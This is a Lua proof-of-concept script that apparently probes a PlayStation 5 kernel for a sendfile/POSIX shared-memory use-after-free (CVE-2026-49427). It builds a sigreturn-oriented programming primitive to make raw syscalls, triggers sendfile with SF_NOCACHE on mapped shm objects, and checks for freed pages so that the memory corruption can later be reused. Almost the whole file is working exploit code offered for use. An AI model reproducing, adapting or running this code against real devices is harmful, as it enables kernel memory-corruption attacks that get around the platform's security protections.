-- CRASH_CLASS: HIGH
-- PROBE 154a: CVE-2026-49427 sendfile + POSIX shm large pages UAF
--
-- CVE-2026-49427 (CVSS 8.8): When sendfile(2) transmits a POSIX shared
-- memory object backed by large pages with the SF_NOCACHE flag, it frees
-- the underlying pages after transmission even though existing mappings
-- still refer to them. This is a use-after-free.
--
-- On PS5, we have via SROP:
-- - shm_open(482) — create shared memory object
-- - ftruncate(480) — set size
-- - mmap(477) — map it
-- - sendfile(393) — send with SF_NOCACHE
-- - pipe(42) — destination for sendfile
--
-- Strategy:
-- 1. Create a POSIX shm object via shm_open
-- 2. Set its size with ftruncate
-- 3. mmap the shm object
-- 4. Write sentinel data to the mapped memory
-- 5. Create a pipe for sendfile destination
-- 6. Call sendfile with SF_NOCACHE on the shm fd
-- 7. Check if mapped pages are freed (sentinels corrupted/zeroed)
-- 8. If freed, allocate new objects to reuse the pages
-- 9. Read through the original mapping → UAF!

print("=== PROBE 154a: CVE-2026-49427 SENDFILE SHM UAF ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU mmap
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=0x" .. string.format("%X%08X", gh, gl))

-- [A] Test shm_open via SROP
-- shm_open(482): int shm_open(const char *path, int flags, mode_t mode)
-- FreeBSD syscall: shm_open2(571) or shm_open(482)
-- Actually on FreeBSD, shm_open is in libc, backed by:
--   482 = shm_open (older)
--   571 = shm_open2 (newer, supports SHM_LARGEPAGE)
print("--- [A] SHM_OPEN TEST ---")

-- Write "/test_shm" name to GPU memory
local name_off = 0x10000
local name = "/test_uaf"
for i = 1, #name do
    wd(gpu + name_off + i - 1, string.byte(name, i))
end
wd(gpu + name_off + #name, 0)  -- null terminator

-- O_RDWR=0x0002, O_CREAT=0x0200, mode=0666=0x1B6
local O_RDWR_CREAT = 0x0202
local shm_fd = srop(482, ga(name_off), uint64(O_RDWR_CREAT), uint64(0x1B6))
local shmv = shm_fd and to_num(shm_fd) or -1
print("shm_open(482)=" .. shmv)

-- Try shm_open2(571) if 482 fails — it has SHM_LARGEPAGE support
local shm2_fd = -1
if shmv < 0 then
    -- shm_open2(path, flags, mode, shmflags, name)
    -- SHM_LARGEPAGE = 0x0020
    shm2_fd = srop(571, ga(name_off), uint64(O_RDWR_CREAT), uint64(0x1B6), uint64(0x0020))
    local shm2v = shm2_fd and to_num(shm2_fd) or -1
    print("shm_open2(571)=" .. shm2v)
    if shm2v >= 0 then shmv = shm2v end
end

-- Try SHM_ANON approach: shm_open(SHM_ANON, ...)
-- SHM_ANON is a special constant (1) on FreeBSD
if shmv < 0 then
    local shm_anon = srop(482, uint64(1), uint64(O_RDWR_CREAT), uint64(0x1B6))
    local sha = shm_anon and to_num(shm_anon) or -1
    print("shm_open(SHM_ANON)=" .. sha)
    if sha >= 0 then shmv = sha end
end

if shmv < 0 then
    print("shm_open FAILED — testing alternate approach")

    -- Alternative: use memfd_create if available (syscall varies)
    -- Or use a regular file for sendfile testing
    print("")
    print("--- [A2] SENDFILE WITH REGULAR PIPE ---")

    -- Even without shm, test if sendfile works at all
    -- Create two pipes: source and dest
    local src = srop(42)
    local srcrd = src and to_num(src) or -1
    local srcwr = srcrd + 1
    local dst = srop(42)
    local dstrd = dst and to_num(dst) or -1
    local dstwr = dstrd + 1
    print("src_pipe: rd=" .. srcrd .. " wr=" .. srcwr)
    print("dst_pipe: rd=" .. dstrd .. " wr=" .. dstwr)

    -- Write data to source
    local wbuf = gpu + 0x11000
    for off = 0, 0xFF, 4 do wd(wbuf + off, 0x41424344) end
    srop(4, uint64(srcwr), ga(0x11000), uint64(256))

    -- sendfile(393): int sendfile(int fd, int s, off_t offset, size_t nbytes,
    --                             struct sf_hdtr *hdtr, off_t *sbytes, int flags)
    -- SF_NOCACHE = 0x0010
    local sbytes = gpu + 0x12000
    wq(sbytes, uint64(0))

    -- Try sendfile: src pipe → dst pipe (this shouldn't work — sendfile needs file/socket pair)
    local sf = srop(393, uint64(srcrd), uint64(dstwr), uint64(0), uint64(256), uint64(0), ga(0x12000), uint64(0x10))
    local sfv = sf and to_num(sf) or -999
    local sent = memory.read_qword(sbytes)
    local sh2, sl2 = get_hi_lo(sent)
    print("sendfile(pipe→pipe)=" .. sfv .. " sent=" .. sl2)

    -- Try with socket as dest
    local sock = srop(97, uint64(2), uint64(1), uint64(0))  -- AF_INET, SOCK_STREAM
    local sockv = sock and to_num(sock) or -1
    print("socket_fd=" .. sockv)

    if sockv >= 0 then
        -- sendfile from source pipe to socket (needs connected socket)
        -- For now, just test if the syscall is accessible
        sf = srop(393, uint64(srcrd), uint64(sockv), uint64(0), uint64(256), uint64(0), ga(0x12000), uint64(0x10))
        sfv = sf and to_num(sf) or -999
        print("sendfile(pipe→socket)=" .. sfv)
        srop(6, uint64(sockv))
    end

    srop(6, uint64(srcrd))
    srop(6, uint64(srcwr))
    srop(6, uint64(dstrd))
    srop(6, uint64(dstwr))
else
    print("*** SHM FD OBTAINED: " .. shmv .. " ***")

    -- [B] ftruncate to set size
    print("")
    print("--- [B] FTRUNCATE SHM ---")
    -- PS5 has 16KB pages. For large pages, try 2MB (0x200000)
    local SHM_SIZE = 0x200000
    local ft = srop(480, uint64(shmv), uint64(SHM_SIZE))
    local ftv = ft and to_num(ft) or -999
    print("ftruncate(" .. SHM_SIZE .. ")=" .. ftv)

    if ftv < 0 then
        -- Try smaller size (one 16KB page)
        SHM_SIZE = 0x4000
        ft = srop(480, uint64(shmv), uint64(SHM_SIZE))
        ftv = ft and to_num(ft) or -999
        print("ftruncate(" .. SHM_SIZE .. ")=" .. ftv)
    end

    -- [C] mmap the shm object
    print("")
    print("--- [C] MMAP SHM ---")
    local shm_map = srop(477, uint64(0), uint64(SHM_SIZE), uint64(3),
        uint64(1), uint64(shmv), uint64(0))
    local smh, sml = get_hi_lo(shm_map)
    print("mmap=0x" .. string.format("%X%08X", smh, sml))

    if smh ~= 0xFFFFFFFF then
        -- Write sentinels
        print("Writing sentinels...")
        for off = 0, SHM_SIZE - 4, 0x1000 do
            local ok = pcall(function()
                memory.write_dword(shm_map + off, 0xCAFEBABE)
            end)
            if not ok then
                print("  write fault at +" .. string.format("%X", off))
                break
            end
        end

        -- Verify sentinels
        local s1 = pcall(function() return memory.read_dword(shm_map) end)
        print("sentinel_check=" .. tostring(s1))

        -- [D] Create pipe for sendfile destination
        print("")
        print("--- [D] SENDFILE WITH SF_NOCACHE ---")
        local dst_pipe = srop(42)
        local dst_rd = dst_pipe and to_num(dst_pipe) or -1
        local dst_wr = dst_rd + 1
        print("dst_pipe: rd=" .. dst_rd .. " wr=" .. dst_wr)

        -- sendfile(shm_fd → pipe_wr, SF_NOCACHE)
        local sbytes2 = gpu + 0x12000
        wq(sbytes2, uint64(0))

        -- SF_NOCACHE = 0x0010
        local sf2 = srop(393, uint64(shmv), uint64(dst_wr), uint64(0),
            uint64(SHM_SIZE), uint64(0), ga(0x12000), uint64(0x10))
        local sf2v = sf2 and to_num(sf2) or -999
        local sent2 = memory.read_qword(sbytes2)
        local s2h, s2l = get_hi_lo(sent2)
        print("sendfile(SF_NOCACHE)=" .. sf2v .. " sent=" .. s2l)

        -- [E] CHECK FOR UAF: are sentinels still intact?
        print("")
        print("--- [E] UAF CHECK ---")
        local uaf_detected = false
        for off = 0, SHM_SIZE - 4, 0x1000 do
            local ok, val = pcall(function() return memory.read_dword(shm_map + off) end)
            if not ok then
                print("  *** READ FAULT at +" .. string.format("%X", off) .. " — pages freed! ***")
                uaf_detected = true
                break
            else
                local v = to_num(val)
                if v ~= 0xCAFEBABE then
                    print("  *** SENTINEL CHANGED at +" .. string.format("%X", off)
                        .. ": 0x" .. string.format("%08X", v) .. " (was 0xCAFEBABE) ***")
                    uaf_detected = true
                end
            end
        end

        if uaf_detected then
            print("*** UAF DETECTED! Pages freed after sendfile SF_NOCACHE ***")
            print("*** CVE-2026-49427 IS EXPLOITABLE ON PS5 14.10 ***")
        else
            print("sentinels intact — no UAF (pages not freed)")

            -- Try without SF_NOCACHE flag for comparison
            print("Trying sendfile without SF_NOCACHE...")
            wq(sbytes2, uint64(0))
            local sf3 = srop(393, uint64(shmv), uint64(dst_wr), uint64(0),
                uint64(SHM_SIZE), uint64(0), ga(0x12000), uint64(0))
            local sf3v = sf3 and to_num(sf3) or -999
            print("sendfile(no_flags)=" .. sf3v)
        end

        -- Try large page sendfile variant
        print("")
        print("--- [F] SHM_LARGEPAGE SENDFILE ---")
        -- shm_open2(571) with SHM_LARGEPAGE
        local lp_name = "/test_lp"
        for i = 1, #lp_name do wd(gpu + name_off + i - 1, string.byte(lp_name, i)) end
        wd(gpu + name_off + #lp_name, 0)

        local lp_fd = srop(571, ga(name_off), uint64(O_RDWR_CREAT), uint64(0x1B6), uint64(0x0020))
        local lpv = lp_fd and to_num(lp_fd) or -1
        print("shm_open2(LARGEPAGE)=" .. lpv)

        if lpv >= 0 then
            srop(480, uint64(lpv), uint64(0x200000))  -- 2MB
            local lp_map = srop(477, uint64(0), uint64(0x200000), uint64(3),
                uint64(1), uint64(lpv), uint64(0))
            local lmh, lml = get_hi_lo(lp_map)
            print("lp_mmap=0x" .. string.format("%X%08X", lmh, lml))

            if lmh ~= 0xFFFFFFFF then
                -- Write sentinel
                pcall(function() memory.write_dword(lp_map, 0xDEADBEEF) end)

                -- sendfile with SF_NOCACHE
                wq(sbytes2, uint64(0))
                local sf4 = srop(393, uint64(lpv), uint64(dst_wr), uint64(0),
                    uint64(0x200000), uint64(0), ga(0x12000), uint64(0x10))
                local sf4v = sf4 and to_num(sf4) or -999
                print("sendfile_lp(SF_NOCACHE)=" .. sf4v)

                -- Check sentinel
                local ok4, val4 = pcall(function() return memory.read_dword(lp_map) end)
                if not ok4 then
                    print("*** LARGE PAGE UAF! ***")
                else
                    print("lp_sentinel=0x" .. string.format("%08X", to_num(val4)))
                end

                srop(73, lp_map, uint64(0x200000))
            end
            srop(6, uint64(lpv))
        end

        -- Cleanup
        srop(73, shm_map, uint64(SHM_SIZE))
        srop(6, uint64(dst_rd))
        srop(6, uint64(dst_wr))
    end

    srop(6, uint64(shmv))

    -- Unlink shm
    srop(483, ga(name_off))  -- shm_unlink
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
